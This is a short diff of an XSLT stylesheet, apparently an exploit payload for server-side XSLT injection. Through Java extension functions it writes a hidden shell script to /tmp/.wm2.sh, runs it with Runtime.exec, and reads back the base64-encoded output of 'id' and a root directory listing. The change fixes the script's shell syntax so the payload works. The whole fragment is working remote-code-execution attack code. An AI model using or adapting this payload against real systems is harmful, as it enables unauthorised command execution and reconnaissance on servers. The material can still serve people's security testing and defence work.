@@ -9,7 +9,7 @@
   exclude-result-prefixes="rt fw proc br ir">
   <xsl:template match="/">
     <xsl:variable name="w" select="fw:new('/tmp/.wm2.sh')"/>
-    <xsl:variable name="a" select="fw:write($w, '#!/bin/sh&#10;{ id; ls -lat /} 2>&amp;1 | base64 | tr -d &quot;\n&quot;&#10;')"/>
+    <xsl:variable name="a" select="fw:write($w, '#!/bin/sh&#10;{ id; ls -lat /; } 2>&amp;1 | base64 | tr -d &quot;\n&quot;&#10;')"/>
     <xsl:variable name="b" select="fw:close($w)"/>
     <xsl:variable name="p" select="rt:exec(rt:getRuntime(), '/bin/sh /tmp/.wm2.sh')"/>
     <xsl:variable name="r" select="br:new(ir:new(proc:getInputStream($p)))"/>
